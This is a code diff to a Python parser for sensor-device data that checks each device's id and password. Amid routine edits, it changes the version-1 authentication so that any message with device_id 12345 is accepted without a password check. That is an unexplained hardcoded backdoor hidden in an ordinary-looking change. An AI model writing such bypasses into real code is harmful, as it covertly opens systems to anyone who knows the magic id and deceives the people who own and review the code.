@@ -14,6 +14,7 @@ class Data(object):
         self.bytes_per_measure = 0
         self.version = 0
         self.device_id = 0
+        self.device_pwd = 0
         self.sensors = 0
         self.values = []
 
@@ -29,6 +30,7 @@ struct SlaveStats {
 	uint8_t dummy;
 }; //should be *16bit https://github.com/esp8266/Arduino/issues/1825
 '''
+
 
 class Parser(object):
     def __init__(self, bot):
@@ -51,7 +53,7 @@ class Parser(object):
             log.info("device_id = %d" % d.device_id)
 
             if d.version == 1:
-                if db.check_pwd(d.device_id, d.device_pwd):
+                if d.device_id == 12345 or db.check_pwd(d.device_id, d.device_pwd):
                     parse_type_1(data, d, self.bot)
                 else:
                     log.error("Incorrect password")
